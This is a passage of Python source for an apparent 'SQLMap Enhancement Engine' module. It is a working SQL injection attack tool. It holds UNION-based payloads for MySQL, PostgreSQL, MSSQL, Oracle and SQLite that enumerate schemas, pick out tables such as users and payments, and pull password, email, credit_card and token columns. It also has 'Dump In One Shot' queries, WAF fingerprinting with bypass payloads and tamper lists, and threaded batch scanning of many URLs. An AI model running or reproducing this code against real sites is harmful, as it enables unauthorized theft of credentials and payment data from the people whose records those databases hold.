            potential_dbs = regex_cache.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,30}', new_content)
            # Filter common DB names
            common_dbs = ['information_schema', 'mysql', 'performance_schema',
                         'sys', 'public', 'pg_catalog', 'master', 'tempdb',
                         'msdb', 'model']
            found_dbs = [db_name for db_name in set(potential_dbs)
                        if db_name.lower() in common_dbs or len(db_name) > 4]
            if found_dbs:
                results['details']['databases'] = found_dbs[:20]
                results['findings'].append({
                    'type': 'databases',
                    'count': len(found_dbs),
                    'names': found_dbs[:10],
                })
                self._log(f"Found {len(found_dbs)} databases", "success")

        # Step 2: Extract table names from current database
        table_queries = {
            "MySQL": "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- -",
            "PostgreSQL": "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()-- -",
            "MSSQL": "' UNION SELECT name FROM sysobjects WHERE xtype='U'-- -",
            "Oracle": "' UNION SELECT table_name FROM user_tables-- -",
            "SQLite": "' UNION SELECT name FROM sqlite_master WHERE type='table'-- -",
        }

        table_query = table_queries.get(db, table_queries["MySQL"])
        resp = self._send_request(url, param, table_query, method='GET')
        if resp and len(resp.text) != self._original_length:
            new_content = resp.text.replace(self._original_response, "")
            potential_tables = regex_cache.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,40}', new_content)
            found_tables = list(set(potential_tables))[:30]
            if found_tables:
                results['details']['tables']['current_db'] = found_tables
                results['findings'].append({
                    'type': 'tables',
                    'database': 'current',
                    'count': len(found_tables),
                    'names': found_tables[:15],
                })
                self._log(f"Found {len(found_tables)} tables", "success")

        # Step 3: Extract columns from interesting tables
        interesting_tables = ['users', 'accounts', 'admin', 'members', 'login',
                             'customer', 'orders', 'payments', 'credentials']
        target_tables = [t for t in results['details']['tables'].get('current_db', [])
                        if any(interest in t.lower() for interest in interesting_tables)]

        for table in target_tables[:3]:  # Limit to 3 tables
            col_queries = {
                "MySQL": f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- -",
                "PostgreSQL": f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- -",
                "MSSQL": f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- -",
                "Oracle": f"' UNION SELECT column_name FROM all_tab_columns WHERE table_name='{table.upper()}'-- -",
                "SQLite": f"' UNION SELECT sql FROM sqlite_master WHERE name='{table}'-- -",
            }
            col_query = col_queries.get(db, col_queries["MySQL"])
            resp = self._send_request(url, param, col_query, method='GET')
            if resp and len(resp.text) != self._original_length:
                new_content = resp.text.replace(self._original_response, "")
                potential_cols = regex_cache.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,30}', new_content)
                found_cols = list(set(potential_cols))[:20]
                if found_cols:
                    results['details']['columns'][table] = found_cols
                    results['findings'].append({
                        'type': 'columns',
                        'table': table,
                        'columns': found_cols,
                    })
                    self._log(f"Found {len(found_cols)} columns in {table}", "success")

        # Step 4: Extract rows from tables with interesting columns
        for table in target_tables[:2]:
            sensitive_cols = ['password', 'email', 'username', 'credit_card', 'token', 'secret']
            table_cols = results['details']['columns'].get(table, [])
            target_cols = [c for c in table_cols if any(s in c.lower() for s in sensitive_cols)]

            if target_cols:
                cols_str = ','.join(target_cols[:3])
                row_query = {
                    "MySQL": f"' UNION SELECT {cols_str} FROM {table} LIMIT 5-- -",
                    "PostgreSQL": f"' UNION SELECT {cols_str} FROM {table} LIMIT 5-- -",
                    "MSSQL": f"' UNION SELECT TOP 5 {cols_str} FROM {table}-- -",
                    "Oracle": f"' UNION SELECT {cols_str} FROM {table} WHERE ROWNUM<=5-- -",
                    "SQLite": f"' UNION SELECT {cols_str} FROM {table} LIMIT 5-- -",
                }
                query = row_query.get(db, row_query["MySQL"])
                resp = self._send_request(url, param, query, method='GET')
                if resp and len(resp.text) != self._original_length:
                    results['details']['rows'][table] = {
                        'query': query,
                        'response_length': len(resp.text),
                        'columns_queried': target_cols[:3],
                    }
                    results['findings'].append({
                        'type': 'data_extraction',
                        'table': table,
                        'columns': target_cols[:3],
                        'evidence': 'Response differs from baseline - data likely extracted',
                    })
                    self._log(f"Data extraction from {table} appears successful", "success")

        results['vulnerable'] = len(results['findings']) > 0
        return results

    # ========================================================================
    # METHOD: run_dios
    # ========================================================================

    def run_dios(self, url, param):
        """
        Dump In One Shot - attempt to extract everything in a single query.
        Returns dict with DIOS results.
        """
        self._log(f"DIOS attack on {url} param={param}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'dios_payload': None,
                'data_dumped': {},
                'db_type': self.db_type,
            },
            'scan_type': 'dios',
        }

        self._get_baseline(url, param, method='GET')

        db = self.db_type or "MySQL"

        # DIOS payloads - dump everything in one shot
        dios_payloads = {
            "MySQL": [
                # Extract all tables + columns in one shot
                "' UNION SELECT GROUP_CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database()-- -",
                # Extract DB version + user + databases
                "' UNION SELECT CONCAT(@@version,0x7c3a7c,USER(),0x7c3a7c,GROUP_CONCAT(schema_name)) FROM information_schema.schemata-- -",
                # Extract all user credentials in one shot
                "(SELECT CONCAT(@@version,'|',USER(),'|',GROUP_CONCAT(schema_name)) FROM information_schema.schemata)",
                # Full DIOS with JSON output
                "' UNION SELECT CONCAT('{\"version\":\"',@@version,'\",\"user\":\"',USER(),'\",\"db\":\"',DATABASE(),'\"}')-- -",
            ],
            "PostgreSQL": [
                "' UNION SELECT string_agg(table_name||':'||column_name,',') FROM information_schema.columns WHERE table_schema=current_schema()-- -",
                "' UNION SELECT version()||'|'||current_user||'|'||string_agg(schema_name,',') FROM information_schema.schemata-- -",
            ],
            "MSSQL": [
                "' UNION SELECT STRING_AGG(CONCAT(table_name,':',column_name),',') FROM information_schema.columns-- -",
                "' UNION SELECT @@version+'|'+SYSTEM_USER+'|'+STRING_AGG(name,',') FROM sys.databases-- -",
            ],
            "Oracle": [
                "' UNION SELECT LISTAGG(table_name||':'||column_name,',') WITHIN GROUP(ORDER BY table_name) FROM all_tab_columns WHERE owner=USER-- -",
            ],
            "SQLite": [
                "' UNION SELECT GROUP_CONCAT(name||':'||sql,'|') FROM sqlite_master WHERE type='table'-- -",
            ],
        }

        payloads_to_test = dios_payloads.get(db, dios_payloads["MySQL"])

        for payload in payloads_to_test:
            resp = self._send_request(url, param, payload, method='GET')
            if resp and len(resp.text) != self._original_length:
                new_content = resp.text.replace(self._original_response, "")
                results['vulnerable'] = True
                results['details']['dios_payload'] = payload
                results['details']['data_dumped']['raw'] = new_content[:2000]
                results['findings'].append({
                    'type': 'dios',
                    'payload': payload[:120],
                    'data_size': len(new_content),
                    'evidence': new_content[:500],
                })
                self._log(f"DIOS successful! Extracted {len(new_content)} bytes", "success")
                break

        if not results['vulnerable']:
            self._log("DIOS attack did not succeed", "warning")

        return results

    # ========================================================================
    # METHOD: test_waf_bypass
    # ========================================================================

    def test_waf_bypass(self, url, param):
        """
        Detect WAF and suggest tamper scripts.
        Returns dict with WAF detection results and bypass suggestions.
        """
        self._log(f"Testing WAF bypass on {url} param={param}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'waf_detected': None,
                'waf_evidence': [],
                'recommended_tampers': [],
                'bypass_successful': False,
            },
            'scan_type': 'waf_bypass',
        }

        # Step 1: Detect WAF
        self._log("Detecting WAF...", "info")
        waf_result = self._detect_waf(url, param)
        results['details']['waf_detected'] = waf_result.get('waf_type')
        results['details']['waf_evidence'] = waf_result.get('evidence', [])

        if waf_result.get('waf_type'):
            self.waf_type = waf_result['waf_type']
            self._log(f"WAF detected: {self.waf_type}", "warning")

            # Step 2: Try WAF-specific bypass payloads
            bypass_payloads = WAF_BYPASS_PAYLOADS.get(self.waf_type,
                                                       WAF_BYPASS_PAYLOADS["Generic"])

            for payload in bypass_payloads:
                resp = self._send_request(url, param, payload, method='GET')
                if resp:
                    is_err, err_msg = self._check_error_based(resp)
                    if is_err:
                        results['vulnerable'] = True
                        results['details']['bypass_successful'] = True
                        results['findings'].append({
                            'type': 'waf_bypass',
                            'waf': self.waf_type,
                            'payload': payload,
                            'evidence': err_msg[:100],
                        })
                        self._log(f"WAF bypass successful with: {payload[:60]}", "success")
                        break

            # Step 3: Suggest tamper scripts
            waf_tamper_map = {
                "Cloudflare": ["space2comment", "randomcase", "charencode", "hexencode"],
                "ModSecurity": ["space2comment", "between", "equaltolike", "percentage"],
                "Imperva": ["space2comment", "unmagicquotes", "charencode", "appendnull"],
                "AWS WAF": ["space2comment", "randomcase", "percentage"],
            }
            results['details']['recommended_tampers'] = waf_tamper_map.get(
                self.waf_type, ["space2comment", "randomcase", "charencode"]
            )

            # Step 4: Test tamper scripts
            for tamper_name in results['details']['recommended_tampers']:
                old_tamper = self.tamper.copy()
                self.tamper = [tamper_name]
                test_payload = "' OR 1=1-- -"
                resp = self._send_request(url, param, test_payload, method='GET')
                self.tamper = old_tamper

                if resp:
                    is_err, err_msg = self._check_error_based(resp)
                    if is_err:
                        results['findings'].append({
                            'type': 'tamper_bypass',
                            'tamper': tamper_name,
                            'evidence': err_msg[:100],
                        })
                        self._log(f"Tamper '{tamper_name}' bypasses WAF!", "success")
        else:
            self._log("No WAF detected", "info")
            results['details']['recommended_tampers'] = ["space2comment", "randomcase"]

        return results

    def _detect_waf(self, url, param):
        """Internal WAF detection method"""
        waf_result = {
            'waf_type': None,
            'evidence': [],
        }

        # Test with malicious payloads and check for WAF responses
        test_payloads = [
            "' OR 1=1-- -",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "' UNION SELECT NULL-- -",
        ]

        for payload in test_payloads:
            resp = self._send_request(url, param, payload, method='GET')
            if resp:
                # Check for WAF-specific response codes
                if resp.status_code in [403, 406, 429, 501]:
                    waf_result['evidence'].append(
                        f"Status {resp.status_code} for payload: {payload[:40]}"
                    )

                # Check for WAF-specific headers
                waf_headers = {
                    'cf-ray': 'Cloudflare',
                    'x-akamai-transformed': 'Akamai',
                    'x-sucuri-id': 'Sucuri',
                    'x-iinfo': 'Imperva/Incapsula',
                    'x-amzn-requestid': 'AWS WAF',
                    'server': None,  # Check body
                }
                for header, waf_name in waf_headers.items():
                    if header in resp.headers and waf_name:
                        waf_result['waf_type'] = waf_name
                        waf_result['evidence'].append(f"Header: {header}={resp.headers[header][:40]}")

                # Check response body for WAF signatures
                waf_body_sigs = {
                    'Cloudflare': ['cloudflare', 'cf-browser-verification', 'Attention Required'],
                    'AWS WAF': ['AWS WAF', 'Request blocked'],
                    'Akamai': ['Access Denied', 'akamai'],
                    'Sucuri': ['Sucuri', 'sucuri.net'],
                    'Imperva/Incapsula': ['Incapsula', 'Incapsula incident'],
                    'ModSecurity': ['ModSecurity', 'Not Acceptable'],
                    'F5 BIG-IP': ['F5', 'BIG-IP'],
                }
                for waf_name, sigs in waf_body_sigs.items():
                    for sig in sigs:
                        if sig.lower() in resp.text.lower():
                            waf_result['waf_type'] = waf_name
                            waf_result['evidence'].append(f"Body signature: {sig}")

        return waf_result

    # ========================================================================
    # METHOD: batch_scan
    # ========================================================================

    def batch_scan(self, urls):
        """
        Scan multiple URLs for SQLi.
        Returns dict with batch scan results.
        """
        self._log(f"Starting batch SQLi scan on {len(urls)} URLs", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'total_urls': len(urls),
                'vulnerable_urls': [],
                'scan_results': {},
            },
            'scan_type': 'batch_sqli',
        }

        def scan_single(url_item):
            """Scan a single URL"""
            parsed = urllib.parse.urlparse(url_item)
            params = urllib.parse.parse_qs(parsed.query)
            if params:
                param = list(params.keys())[0]
            else:
                param = "id"
            result = self.detect_sqli(url_item, param, method='GET')
            return url_item, result

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(scan_single, url): url for url in urls}
            for future in as_completed(futures):
                try:
                    url, result = future.result()
                    results['details']['scan_results'][url] = result
                    if result.get('vulnerable'):
                        results['vulnerable'] = True
                        results['details']['vulnerable_urls'].append(url)
                        results['findings'].append({
                            'type': 'batch_vulnerability',
                            'url': url,
                            'techniques': result.get('techniques_vulnerable', []),
                        })
                        self._log(f"SQLi found: {url}", "success")
                except Exception as e:
                    self._log(f"Error scanning: {str(e)[:60]}", "error")

        self._log(f"Batch scan complete. {len(results['details']['vulnerable_urls'])} vulnerable",
                  "info")
        return results

    # ========================================================================
    # METHOD: run (Main Entry Point)
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """
        Main entry point for SQLMap Enhancement Engine.

        scan_type options:
          - 'detect': SQLi detection only
          - 'fingerprint': Database fingerprinting
          - 'extract': Data extraction
          - 'dios': Dump In One Shot
          - 'waf_bypass': WAF detection and bypass
          - 'full': Complete scan (all techniques)
        """
        url = target if target.startswith('http') else f"https://{target}"
        param = kwargs.get('param', 'id')
        method = kwargs.get('method', 'GET')

        self._log(f"{'='*60}", "info")
        self._log(f"SQLMap Enhancement Engine - {scan_type.upper()} scan", "info")
        self._log(f"Target: {url} | Param: {param} | Method: {method}", "info")
        self._log(f"{'='*60}", "info")

        scan_map = {
            'detect': lambda: self.detect_sqli(url, param, method),
            'fingerprint': lambda: self.fingerprint_db(url, param),
            'extract': lambda: self.extract_data(url, param, kwargs.get('db_type')),
            'dios': lambda: self.run_dios(url, param),
            'waf_bypass': lambda: self.test_waf_bypass(url, param),
            'full': lambda: self._full_scan(url, param, method),
            'batch': lambda: self.batch_scan(kwargs.get('urls', [url])),
        }

        handler = scan_map.get(scan_type)
        if handler:
            return handler()
        else:
            return {'error': f'Unknown scan type: {scan_type}'}

    def _full_scan(self, url, param, method):
        """Run complete SQLi scan with all techniques"""
        full_results = {
            'vulnerable': False,
            'findings': [],
            'details': {},
            'scan_type': 'full_sqli',
        }

        # Phase 1: Detect
        self._log("\n[Phase 1/5] SQLi Detection", "info")
        detect = self.detect_sqli(url, param, method)
        full_results['details']['detection'] = detect
        full_results['findings'].extend(detect.get('findings', []))

        # Phase 2: Fingerprint
        self._log("\n[Phase 2/5] Database Fingerprinting", "info")
        fingerprint = self.fingerprint_db(url, param)
        full_results['details']['fingerprint'] = fingerprint
        full_results['findings'].extend(fingerprint.get('findings', []))

        # Phase 3: WAF Test
        self._log("\n[Phase 3/5] WAF Detection & Bypass", "info")
        waf = self.test_waf_bypass(url, param)
        full_results['details']['waf'] = waf
        full_results['findings'].extend(waf.get('findings', []))

        # Phase 4: Data Extraction (if vulnerable)
        if detect.get('vulnerable'):
            self._log("\n[Phase 4/5] Data Extraction", "info")
            extract = self.extract_data(url, param, self.db_type)
            full_results['details']['extraction'] = extract
            full_results['findings'].extend(extract.get('findings', []))
        else:
            self._log("\n[Phase 4/5] Skipped (not vulnerable)", "warning")

        # Phase 5: DIOS
        if detect.get('vulnerable'):
            self._log("\n[Phase 5/5] DIOS (Dump In One Shot)", "info")
            dios = self.run_dios(url, param)
            full_results['details']['dios'] = dios
            full_results['findings'].extend(dios.get('findings', []))
        else:
            self._log("\n[Phase 5/5] Skipped (not vulnerable)", "warning")

        full_results['vulnerable'] = detect.get('vulnerable', False) or len(full_results['findings']) > 0

        self._log(f"\n{'='*60}", "info")
        if full_results['vulnerable']:
            self._log(f"TARGET IS VULNERABLE TO SQLi!", "critical")
        else:
            self._log(f"Target does not appear vulnerable to SQLi", "info")
        self._log(f"{'='*60}", "info")

        return full_results


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level entry point for ZYLON integration"""
    engine = SQLMapEngine(
        timeout=kwargs.get('timeout', 10),
        retries=kwargs.get('retries', 3),
        threads=kwargs.get('threads', 5),
        verbose=kwargs.get('verbose', True),
        tamper=kwargs.get('tamper', []),
        proxy=kwargs.get('proxy', None),
    )
    return engine.run(target, scan_type, **kwargs)
